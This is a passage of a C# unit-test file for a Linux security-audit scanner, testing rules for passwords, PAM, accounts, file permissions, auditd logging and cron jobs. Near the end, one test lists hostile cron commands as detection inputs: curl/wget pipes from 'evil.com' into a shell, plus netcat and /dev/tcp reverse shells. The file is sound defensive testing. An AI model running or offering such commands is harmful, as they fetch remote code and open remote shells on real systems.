        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void EmptyPasswordRule_SystemLocked_Passes()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "bin", Uid = 1, Shell = "/usr/sbin/nologin" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "bin", PasswordHash = "*" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void EmptyPasswordRule_ValidHash_Passes()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "$6$rounds=5000$xyz$abc" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PasswordAgingRule_MaxDaysTooHigh_Fails()
    {
        var rule = new PasswordAgingRule();
        var data = new ScanData
        {
            LoginDefs = new LoginDefs { Readable = true, PassMaxDays = 99999, PassMinDays = 1, PassWarnAge = 7 }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void PasswordAgingRule_MinDaysZero_Fails()
    {
        var rule = new PasswordAgingRule();
        var data = new ScanData
        {
            LoginDefs = new LoginDefs { Readable = true, PassMaxDays = 90, PassMinDays = 0, PassWarnAge = 7 }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void PasswordAgingRule_WarnAgeLow_Fails()
    {
        var rule = new PasswordAgingRule();
        var data = new ScanData
        {
            LoginDefs = new LoginDefs { Readable = true, PassMaxDays = 90, PassMinDays = 1, PassWarnAge = 3 }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void PasswordAgingRule_Valid_Passes()
    {
        var rule = new PasswordAgingRule();
        var data = new ScanData
        {
            LoginDefs = new LoginDefs { Readable = true, PassMaxDays = 90, PassMinDays = 1, PassWarnAge = 7 }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PasswordAgingRule_ShadowMaxDaysHigh_Fails()
    {
        var rule = new PasswordAgingRule();
        var data = new ScanData
        {
            LoginDefs = new LoginDefs { Readable = true, PassMaxDays = 90, PassMinDays = 1, PassWarnAge = 7 },
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", MaxDays = 99999 } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void PamPasswordComplexityRule_NoModule_Fails()
    {
        var rule = new PamPasswordComplexityRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig { Readable = true, RawLines = new[] { "password required pam_unix.so sha512" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void PamPasswordComplexityRule_Pwquality_Passes()
    {
        var rule = new PamPasswordComplexityRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig { Readable = true, RawLines = new[] { "password requisite pam_pwquality.so retry=3" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamPasswordComplexityRule_Cracklib_Passes()
    {
        var rule = new PamPasswordComplexityRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig { Readable = true, RawLines = new[] { "password required pam_cracklib.so difok=3" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamPasswordComplexityRule_MissingData_Passes()
    {
        var rule = new PamPasswordComplexityRule();
        var data = new ScanData { PamConfig = null };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void InactiveAccountsRule_LockedInteractive_Fails()
    {
        var rule = new InactiveAccountsRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "!!" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void InactiveAccountsRule_Expired_Fails()
    {
        var rule = new InactiveAccountsRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "$6$xyz", ExpireDate = 1 } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void InactiveAccountsRule_Active_Passes()
    {
        var rule = new InactiveAccountsRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "$6$xyz", ExpireDate = null } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void DuplicateUidsRule_Duplicate_Fails()
    {
        var rule = new DuplicateUidsRule();
        var data = new ScanData
        {
            UserAccounts = new[]
            {
                new UserAccount { Username = "alice", Uid = 1000 },
                new UserAccount { Username = "bob", Uid = 1000 }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void DuplicateUidsRule_Unique_Passes()
    {
        var rule = new DuplicateUidsRule();
        var data = new ScanData
        {
            UserAccounts = new[]
            {
                new UserAccount { Username = "alice", Uid = 1000 },
                new UserAccount { Username = "bob", Uid = 1001 }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void MissingHomeDirectoryRule_Missing_Fails()
    {
        var rule = new MissingHomeDirectoryRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash", HomeDirectory = "/nonexistent/home/alice", HomeDirectoryExists = false } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void MissingHomeDirectoryRule_Exists_Passes()
    {
        var rule = new MissingHomeDirectoryRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash", HomeDirectory = "/home/alice", HomeDirectoryExists = true } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void EmptyPasswordRule_ShadowUnreadable_NotApplicable()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            Capabilities = new[] { new DataSourceCapability { SourceName = "shadow", Status = CapabilityStatus.PermissionLimited } },
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = Array.Empty<ShadowEntry>()
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void EmptyPasswordRule_RootEmptyPassword_Fails()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "root", Uid = 0, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "root", PasswordHash = "" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void UserAccountRules_MissingData_Passes()
    {
        var data = new ScanData { UserAccounts = Array.Empty<UserAccount>(), ShadowEntries = Array.Empty<ShadowEntry>() };

        Assert.True(new UidZeroBeyondRootRule().Evaluate(data).Passed);
        Assert.True(new EmptyPasswordRule().Evaluate(data).Passed);
        Assert.True(new PasswordAgingRule().Evaluate(data).Passed);
        Assert.True(new PamPasswordComplexityRule().Evaluate(data).Passed);
        Assert.True(new InactiveAccountsRule().Evaluate(data).Passed);
        Assert.True(new DuplicateUidsRule().Evaluate(data).Passed);
        Assert.True(new MissingHomeDirectoryRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // CIS Benchmark Mapping
    // =====================================================================

    [Theory]
    [InlineData(typeof(FirewallDefaultDropRule), "CIS 4.5")]
    [InlineData(typeof(FirewallSshExposureRule), "CIS 4.5")]
    [InlineData(typeof(FirewallStateTrackingRule), "CIS 4.5")]
    [InlineData(typeof(FirewallActiveRule), "CIS 4.5")]
    [InlineData(typeof(FirewallIcmpRule), "CIS 4.5")]
    [InlineData(typeof(DefaultRouteRule), "CIS 4.1")]
    [InlineData(typeof(SuspiciousConnectionsRule), "CIS 13.3")]
    [InlineData(typeof(NetworkInterfaceUpRule), "CIS 4.1")]
    [InlineData(typeof(LoopbackExposureRule), "CIS 4.1")]
    [InlineData(typeof(SshNonDefaultPortRule), "CIS 4.8")]
    [InlineData(typeof(WideOpenServicesRule), "CIS 4.1")]
    [InlineData(typeof(DatabasePortExposureRule), "CIS 4.1")]
    [InlineData(typeof(HighPortListeningRule), "CIS 13.3")]
    [InlineData(typeof(TelnetServiceRule), "CIS 4.8")]
    [InlineData(typeof(FtpServiceRule), "CIS 4.8")]
    [InlineData(typeof(SshServiceRule), "CIS 4.1")]
    [InlineData(typeof(LegacyRservicesRule), "CIS 4.8")]
    [InlineData(typeof(UnnecessaryServicesRule), "CIS 4.8")]
    [InlineData(typeof(SshPermitRootLoginRule), "CIS 5.4")]
    [InlineData(typeof(SshPasswordAuthenticationRule), "CIS 6.3")]
    [InlineData(typeof(SshMaxAuthTriesRule), "CIS 6.3")]
    [InlineData(typeof(SshProtocolRule), "CIS 4.8")]
    [InlineData(typeof(SshEmptyPasswordsRule), "CIS 5.2")]
    [InlineData(typeof(SshPubkeyAuthenticationRule), "CIS 6.3")]
    [InlineData(typeof(SshX11ForwardingRule), "CIS 4.8")]
    [InlineData(typeof(ShadowPermissionRule), "CIS 6.1")]
    [InlineData(typeof(PasswdPermissionRule), "CIS 6.1")]
    [InlineData(typeof(SshHostKeyPermissionRule), "CIS 5.2")]
    [InlineData(typeof(RootSshDirectoryPermissionRule), "CIS 5.2")]
    [InlineData(typeof(CronDirectoryWorldWritableRule), "CIS 6.1")]
    [InlineData(typeof(CrontabPermissionRule), "CIS 6.1")]
    [InlineData(typeof(UserSshDirectoryPermissionRule), "CIS 5.2")]
    [InlineData(typeof(AslrEnabledRule), "CIS 1.5")]
    [InlineData(typeof(IpForwardingDisabledRule), "CIS 3.1")]
    [InlineData(typeof(IcmpRedirectsDisabledRule), "CIS 3.1")]
    [InlineData(typeof(SourceRoutingDisabledRule), "CIS 3.1")]
    [InlineData(typeof(KernelModuleLoadingRestrictedRule), "CIS 1.4")]
    [InlineData(typeof(SecureBootEnabledRule), "CIS 1.4")]
    [InlineData(typeof(KernelPointerExposureRestrictedRule), "CIS 1.5")]
    [InlineData(typeof(UidZeroBeyondRootRule), "CIS 6.2")]
    [InlineData(typeof(EmptyPasswordRule), "CIS 5.4")]
    [InlineData(typeof(PasswordAgingRule), "CIS 5.4")]
    [InlineData(typeof(PamPasswordComplexityRule), "CIS 5.4")]
    [InlineData(typeof(InactiveAccountsRule), "CIS 6.2")]
    [InlineData(typeof(DuplicateUidsRule), "CIS 6.2")]
    [InlineData(typeof(MissingHomeDirectoryRule), "CIS 6.2")]
    [InlineData(typeof(LoggingServiceActiveRule), "CIS 8.1")]
    [InlineData(typeof(AuditdActiveRule), "CIS 8.2")]
    [InlineData(typeof(AuditdRulesConfiguredRule), "CIS 8.2")]
    [InlineData(typeof(LogRotationConfiguredRule), "CIS 8.3")]
    [InlineData(typeof(CentralForwardingConfiguredRule), "CIS 8.4")]
    [InlineData(typeof(AuditdPrivilegeEscalationMonitoringRule), "CIS 8.2")]
    [InlineData(typeof(ForwardingUsesTcpRule), "CIS 8.4")]
    public void KeyRules_HaveCisMappings(Type ruleType, string expectedControlId)
    {
        var rule = (IRule)Activator.CreateInstance(ruleType)!;

        Assert.NotEmpty(rule.CisMappings);
        Assert.Contains(rule.CisMappings, m => m.ControlId == expectedControlId);
        Assert.All(rule.CisMappings, m =>
        {
            Assert.False(string.IsNullOrWhiteSpace(m.ControlName));
            Assert.False(string.IsNullOrWhiteSpace(m.WhyItMatters));
        });
    }

    [Fact]
    public void CisMappings_FlowThrough_ToFailedResult()
    {
        var rule = new FirewallActiveRule();
        var data = new ScanData { FirewallActive = false, FirewallRules = Array.Empty<FirewallRule>() };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.NotEmpty(result.CisMappings);
        Assert.Equal(rule.CisMappings, result.CisMappings);
    }

    [Fact]
    public void CisMappings_FlowThrough_ToPassedResult()
    {
        var rule = new FirewallActiveRule();
        var data = new ScanData
        {
            FirewallActive = true,
            FirewallRules = new[] { new FirewallRule { Chain = "INPUT", Target = "DROP" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.NotEmpty(result.CisMappings);
        Assert.Equal(rule.CisMappings, result.CisMappings);
    }

    // =====================================================================
    // Filesystem Audit Rules
    // =====================================================================

    [Fact]
    public void WorldWritableFileRule_NoFiles_Passes()
    {
        var rule = new WorldWritableFileRule();
        var data = new ScanData { FilesystemAudits = Array.Empty<FilesystemAuditEntry>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void WorldWritableFileRule_FilesFound_Fails()
    {
        var rule = new WorldWritableFileRule();
        var data = new ScanData
        {
            FilesystemAudits = new[]
            {
                new FilesystemAuditEntry { Path = "/opt/app/data.txt", Mode = "666", Owner = "root", Group = "root", AuditCategory = "WorldWritableFile" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void UnexpectedSuidSgidRule_ExpectedOnly_Passes()
    {
        var rule = new UnexpectedSuidSgidRule();
        var data = new ScanData
        {
            FilesystemAudits = new[]
            {
                new FilesystemAuditEntry { Path = "/usr/bin/sudo", Mode = "4755", Owner = "root", Group = "root", AuditCategory = "SuidBinary" },
                new FilesystemAuditEntry { Path = "/usr/bin/passwd", Mode = "4755", Owner = "root", Group = "root", AuditCategory = "SuidBinary" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void UnexpectedSuidSgidRule_UnexpectedFound_Fails()
    {
        var rule = new UnexpectedSuidSgidRule();
        var data = new ScanData
        {
            FilesystemAudits = new[]
            {
                new FilesystemAuditEntry { Path = "/usr/bin/sudo", Mode = "4755", Owner = "root", Group = "root", AuditCategory = "SuidBinary" },
                new FilesystemAuditEntry { Path = "/tmp/backdoor", Mode = "4755", Owner = "root", Group = "root", AuditCategory = "SuidBinary" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void UnownedFileRule_None_Passes()
    {
        var rule = new UnownedFileRule();
        var data = new ScanData { FilesystemAudits = Array.Empty<FilesystemAuditEntry>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void UnownedFileRule_Found_Fails()
    {
        var rule = new UnownedFileRule();
        var data = new ScanData
        {
            FilesystemAudits = new[]
            {
                new FilesystemAuditEntry { Path = "/opt/orphan.log", Mode = "644", Owner = "9999", Group = "9999", AuditCategory = "UnownedFile" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void WorldWritableDirNoStickyRule_None_Passes()
    {
        var rule = new WorldWritableDirNoStickyRule();
        var data = new ScanData { FilesystemAudits = Array.Empty<FilesystemAuditEntry>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void WorldWritableDirNoStickyRule_Found_Fails()
    {
        var rule = new WorldWritableDirNoStickyRule();
        var data = new ScanData
        {
            FilesystemAudits = new[]
            {
                new FilesystemAuditEntry { Path = "/opt/shared", Mode = "777", Owner = "root", Group = "root", AuditCategory = "WorldWritableDirNoSticky" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void TmpHardeningRule_AllOptions_Passes()
    {
        var rule = new TmpHardeningRule();
        var data = new ScanData { TmpMountOptions = "rw,noexec,nosuid,nodev,relatime" };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void TmpHardeningRule_MissingOptions_Fails()
    {
        var rule = new TmpHardeningRule();
        var data = new ScanData { TmpMountOptions = "rw,relatime" };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void TmpHardeningRule_NoData_Passes()
    {
        var rule = new TmpHardeningRule();
        var data = new ScanData { TmpMountOptions = string.Empty };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void FilesystemAuditRules_MissingData_Passes()
    {
        var data = new ScanData { FilesystemAudits = Array.Empty<FilesystemAuditEntry>(), TmpMountOptions = string.Empty };

        Assert.True(new WorldWritableFileRule().Evaluate(data).Passed);
        Assert.True(new UnexpectedSuidSgidRule().Evaluate(data).Passed);
        Assert.True(new UnownedFileRule().Evaluate(data).Passed);
        Assert.True(new WorldWritableDirNoStickyRule().Evaluate(data).Passed);
        Assert.True(new TmpHardeningRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // Logging & Audit Rules
    // =====================================================================

    [Fact]
    public void LoggingServiceActiveRule_NoLoggingService_Fails()
    {
        var rule = new LoggingServiceActiveRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { RsyslogActive = false, JournaldActive = false }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void LoggingServiceActiveRule_RsyslogActive_Passes()
    {
        var rule = new LoggingServiceActiveRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { RsyslogActive = true, JournaldActive = false }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void LoggingServiceActiveRule_JournaldActive_Passes()
    {
        var rule = new LoggingServiceActiveRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { RsyslogActive = false, JournaldActive = true }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdActiveRule_Inactive_Fails()
    {
        var rule = new AuditdActiveRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = false }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void AuditdActiveRule_Active_Passes()
    {
        var rule = new AuditdActiveRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdRulesConfiguredRule_ActiveNoRules_Fails()
    {
        var rule = new AuditdRulesConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true, AuditdRulesConfigured = false }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void AuditdRulesConfiguredRule_ActiveWithRules_Passes()
    {
        var rule = new AuditdRulesConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true, AuditdRulesConfigured = true }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdRulesConfiguredRule_AuditdInactive_Passes()
    {
        var rule = new AuditdRulesConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = false, AuditdRulesConfigured = false }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void LogRotationConfiguredRule_Missing_Fails()
    {
        var rule = new LogRotationConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { LogRotationConfigured = false }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Low, result.Severity);
    }

    [Fact]
    public void LogRotationConfiguredRule_Configured_Passes()
    {
        var rule = new LogRotationConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { LogRotationConfigured = true }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_ServerNoForwarding_Fails()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_ServerWithForwarding_Passes()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = true }
        };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_WorkstationNoForwarding_Passes()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };
        var context = new RuleEvaluationContext(MachineRole.Workstation, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_DevMachineNoForwarding_Passes()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };
        var context = new RuleEvaluationContext(MachineRole.DevMachine, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_LabBoxNoForwarding_Passes()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };
        var context = new RuleEvaluationContext(MachineRole.LabBox, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_RouterNoForwarding_Passes()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };
        var context = new RuleEvaluationContext(MachineRole.Router, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CentralForwardingConfiguredRule_NonContextualDefaultsToWorkstation()
    {
        var rule = new CentralForwardingConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { CentralForwardingConfigured = false }
        };

        // Non-contextual overload defaults to Workstation, which is exempt from forwarding.
        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdPrivilegeEscalationMonitoringRule_NoRules_Passes()
    {
        var rule = new AuditdPrivilegeEscalationMonitoringRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true, AuditdRulesConfigured = false, AuditdRules = Array.Empty<string>() }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdPrivilegeEscalationMonitoringRule_HasPrivEsc_Passes()
    {
        var rule = new AuditdPrivilegeEscalationMonitoringRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig
            {
                AuditdActive = true,
                AuditdRulesConfigured = true,
                AuditdRules = new[] { "-a always,exit -F arch=b64 -S setuid,setgid -k privilege_escalation" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AuditdPrivilegeEscalationMonitoringRule_MissingPrivEsc_Fails()
    {
        var rule = new AuditdPrivilegeEscalationMonitoringRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig
            {
                AuditdActive = true,
                AuditdRulesConfigured = true,
                AuditdRules = new[] { "-w /etc/passwd -p wa -k identity" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void ForwardingUsesTcpRule_AllTcp_Passes()
    {
        var rule = new ForwardingUsesTcpRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig
            {
                CentralForwardingConfigured = true,
                ForwardingTargets = new[] { "@@192.168.1.10:514", "@@logs.example.com" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void ForwardingUsesTcpRule_HasUdp_Fails()
    {
        var rule = new ForwardingUsesTcpRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig
            {
                CentralForwardingConfigured = true,
                ForwardingTargets = new[] { "@@192.168.1.10:514", "@192.168.1.11" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void ForwardingUsesTcpRule_NoForwarding_Passes()
    {
        var rule = new ForwardingUsesTcpRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig
            {
                CentralForwardingConfigured = false,
                ForwardingTargets = Array.Empty<string>()
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void LoggingAuditRules_MissingData_NotApplicable()
    {
        var data = new ScanData { LoggingAudit = null };

        Assert.Equal(RuleStatus.NotApplicable, new LoggingServiceActiveRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new AuditdActiveRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new AuditdRulesConfiguredRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new LogRotationConfiguredRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new CentralForwardingConfiguredRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new AuditdPrivilegeEscalationMonitoringRule().Evaluate(data).Status);
        Assert.Equal(RuleStatus.NotApplicable, new ForwardingUsesTcpRule().Evaluate(data).Status);
    }

    [Fact]
    public void AuditdRulesConfiguredRule_ReadWarning_NotApplicable()
    {
        var rule = new AuditdRulesConfiguredRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true, AuditdRulesConfigured = false, ReadWarning = "auditctl: permission denied" }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void AuditdPrivilegeEscalationMonitoringRule_ReadWarning_NotApplicable()
    {
        var rule = new AuditdPrivilegeEscalationMonitoringRule();
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { AuditdActive = true, AuditdRulesConfigured = true, AuditdRules = new[] { "-w /etc/passwd -p wa -k identity" }, ReadWarning = "auditctl: permission denied" }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void LoggingAuditRules_ReadWarning_NonAuditdRulesStillEvaluate()
    {
        // ReadWarning is specific to auditd rules. Other logging rules should still evaluate.
        var data = new ScanData
        {
            LoggingAudit = new LoggingAuditConfig { RsyslogActive = false, JournaldActive = false, ReadWarning = "auditctl: permission denied" }
        };

        Assert.False(new LoggingServiceActiveRule().Evaluate(data).Passed);
        Assert.False(new AuditdActiveRule().Evaluate(data).Passed);
        Assert.False(new LogRotationConfiguredRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // Cron Job Rules
    // =====================================================================

    [Fact]
    public void SuspiciousCronEntryRule_BenCommand_Passes()
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "0 5 * * *", Command = "/usr/bin/backup.sh", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Theory]
    [InlineData("/tmp/reverse.sh")]
    [InlineData("curl http://evil.com | bash")]
    [InlineData("wget -O - http://evil.com | sh")]
    [InlineData("nc -e /bin/bash 10.0.0.1 4444")]
    [InlineData("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")]
    [InlineData("python -c 'import pty; pty.spawn(\"/bin/bash\")'")]
    [InlineData("perl -e 'use Socket;'")]
    [InlineData("echo d2hvYW1p | python -c 'import os; os.system(\"id\")'")]
    [InlineData("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f")]
    public void SuspiciousCronEntryRule_SuspiciousCommand_Fails(string command)
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = command, RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void WorldWritableCronScriptRule_Safe_Passes()
    {
        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData
        {
            CronJobs = new[]
            {
                new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "755", ScriptOwner = "root", ScriptGroup = "root" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void WorldWritableCronScriptRule_WorldWritable_Fails()
    {
